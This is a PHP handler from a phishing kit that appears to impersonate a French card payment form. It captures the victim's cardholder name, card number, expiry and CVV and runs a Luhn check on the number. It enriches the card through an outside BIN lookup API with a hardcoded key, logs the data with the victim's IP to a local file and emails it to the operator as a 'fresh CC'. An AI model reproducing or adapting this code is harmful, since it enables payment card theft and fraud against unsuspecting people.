<?php
  error_reporting(0);
  ob_start();
  session_start();
include'../antibots.php';
  include '../email.php';
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $_SESSION["n_card"]   = $_POST["n_card"];
    $_SESSION["c_num"]    = $_POST["c_num"];
    $_SESSION["exm"]    = $_POST["exm"];
    $_SESSION["exy"]    = $_POST["exy"];
    $_SESSION["csc"]    = $_POST["csc"];
$url = 'http://b3xtapi.academy/?bin='.$_SESSION["c_num"].'&user=workhard&apikey=7eqPEW3v2wPAdb9TlhMpPUfl8Wi7lfmE';
$json = file_get_contents($url);
$json = json_decode($json);
$country = $json->country;
$scheme = $json->scheme;
$type = $json->type;
$level = $json->level;
$bank = $json->bank;
$message = '
💰  Nom  : '.$_SESSION["n_card"].'
💰  Numero de Carte : '.$_SESSION["c_num"].'
💰  Date Expiration : '.$_SESSION["exm"].'/'.$_SESSION["exy"].'
💰  Cryptogram Visuel : '.$_SESSION["csc"].'
💰  IP : '._ip().'
💰  User Agent : '.$_SERVER["HTTP_USER_AGENT"].'
';
$Subject=  "💳 NEW FR3SH CC 💳  |".$bank."|".$country."|".$scheme."|".$type."|".$level."|"._ip();
$head="From:⭐S4N705 ⭐   <CC>";
$fil = fopen('0n_r3z_p4s_n0us.txt', 'a+');
function is_valid_luhn($number) {
  settype($number, 'string');
  $sumTable = array(
    array(0,1,2,3,4,5,6,7,8,9),
    array(0,2,4,6,8,1,3,5,7,9));
  $sum = 0;
  $flip = 0;
  for ($i = strlen($number) - 1; $i >= 0; $i--) {
    $sum += $sumTable[$flip++ & 0x1][$number[$i]];
  }
  return $sum % 10 === 0;
}
if(is_valid_luhn($_SESSION["c_num"]) && is_numeric($_SESSION["c_num"])){
     fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_four']  = true;
mail($my_mail,$Subject,$message,$head);
    header('location: bank.php?enc=' . md5(time()) . '&p=1&dispatch=' . sha1(time()));
    }else {
        header('location: card.php?error=true');
    }
}
else
{
  header('location: ../../index.php');
}
